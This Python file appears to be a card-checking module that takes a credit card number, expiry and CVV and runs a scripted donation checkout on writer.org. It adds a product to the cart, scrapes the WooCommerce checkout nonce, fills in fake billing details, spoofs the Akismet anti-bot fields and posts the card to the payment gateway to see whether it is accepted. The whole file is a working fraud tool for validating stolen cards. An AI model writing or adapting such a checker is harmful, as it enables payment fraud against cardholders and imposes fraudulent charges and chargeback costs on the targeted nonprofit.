from all.configs._def_main_ import *


async def rimurufunc(cc, mes, ano, cvv):
    email = get_email()
    ano1 = int(ano)
    ano = ano1 % 100
    ssl_context = ssl.create_default_context(cafile=certifi.where())
    conn = aiohttp.TCPConnector(ssl=ssl_context)
    async with aiohttp.ClientSession(connector=conn) as sess:
        headers = {
            'authority': 'writer.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'content-type': 'multipart/form-data; boundary=----WebKitFormBoundaryrF8vhUwbBoKGIwF4',
            'origin': 'https://writer.org',
            'referer': 'https://writer.org/product/one-time-donation/?attribute_pa_donation-amount=other-amount',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
        }
        params = {
            'attribute_pa_donation-amount': 'other-amount',
        }
        data = '------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="attribute_pa_donation-amount"\r\n\r\nother-amount\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="payyourprice_contribution"\r\n\r\n\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="quantity"\r\n\r\n1\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="add-to-cart"\r\n\r\n2169707\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="product_id"\r\n\r\n2169707\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="variation_id"\r\n\r\n2169713\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bib"\r\n\r\n\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bfs"\r\n\r\n1694414584644\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bkpc"\r\n\r\n0\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bkp"\r\n\r\n\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bmc"\r\n\r\n71;79,5553;\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bmcc"\r\n\r\n2\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bmk"\r\n\r\n\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bck"\r\n\r\n\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bmmc"\r\n\r\n5\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_btmc"\r\n\r\n0\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bsc"\r\n\r\n3\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bte"\r\n\r\n\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_btec"\r\n\r\n0\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4\r\nContent-Disposition: form-data; name="ak_bmm"\r\n\r\n2690,74;411,749;824,271;282,225;1160,681;\r\n------WebKitFormBoundaryrF8vhUwbBoKGIwF4--\r\n'
        async with sess.post('https://writer.org/product/one-time-donation/', params=params, headers=headers, data=data) as resp:
            req1 = await resp.text()
            print("[ + ] Req 1 Complete")
        headers = {
            'authority': 'writer.org',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'referer': 'https://writer.org/cart/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
        }
        async with sess.get('https://writer.org/checkout/', headers=headers) as resp:
            req2 = await resp.text()
            _checkout_nonce = parseX(
                req2, 'name="woocommerce-process-checkout-nonce" value="', '"')
            print("[ + ] Req 2 Complete")
        headers = {
            'authority': 'writer.org',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://writer.org',
            'referer': 'https://writer.org/checkout/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36 OPR/100.0.0.0 (Edition std-1)',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'wc-ajax': 'checkout',
        }
        data = {
            'billing_first_name': 'sadsa',
            'billing_last_name': 'sadsa',
            'billing_company': '',
            'billing_country': 'US',
            'billing_address_1': '2531 Cimmaron Road',
            'billing_address_2': '',
            'billing_city': 'Santa Ana',
            'billing_state': 'CA',
            'billing_postcode': '92704',
            'billing_phone': '7145577441',
            'billing_email': f'{email}',
            'order_comments': '',
            'payment_method': 'nmipay',
            'nmipay-card-number': f'{cc}',
            'nmipay-card-expiry': f'{mes} / {ano}',
            'nmipay-card-cvc': f'{cvv}',
            'woocommerce-process-checkout-nonce': f'{_checkout_nonce}',
            '_wp_http_referer': '/?wc-ajax=update_order_review',
            'ak_bib': '1694414887940',
            'ak_bfs': '1694414902121',
            'ak_bkpc': '14',
            'ak_bkp': '119,113;286;135;105,128;111;128,103;71,785;127,393;191,657;239,353;119,128;94;143;111,64;',
            'ak_bmc': '70;163,56;101,864;91,629;122,80;101,10049;147,64;86,6607;382,57;79,15442;102,27609;',
            'ak_bmcc': '11',
            'ak_bmk': '',
            'ak_bck': '5;6;9',
            'ak_bmmc': '13',
            'ak_btmc': '0',
            'ak_bsc': '9',
            'ak_bte': '',
            'ak_btec': '0',
            'ak_bmm': '1369,297;96,213;232,4;1832,307;880,2104;6369,1587;3349,375;655,1447;2455,896;832,301;1506,606;727,1937;883,2375;',
        }
        async with sess.post('https://writer.org/', params=params, headers=headers, data=data) as resp:
            req3 = await resp.json()
            try:
                soup = BeautifulSoup(
                    req3['messages'], 'html.parser')

                resp = soup.find(
                    'ul', {'class': 'woocommerce-error'}).text.strip()
            except KeyError:
                response_json = req3
                resp = response_json['result']
            return resp
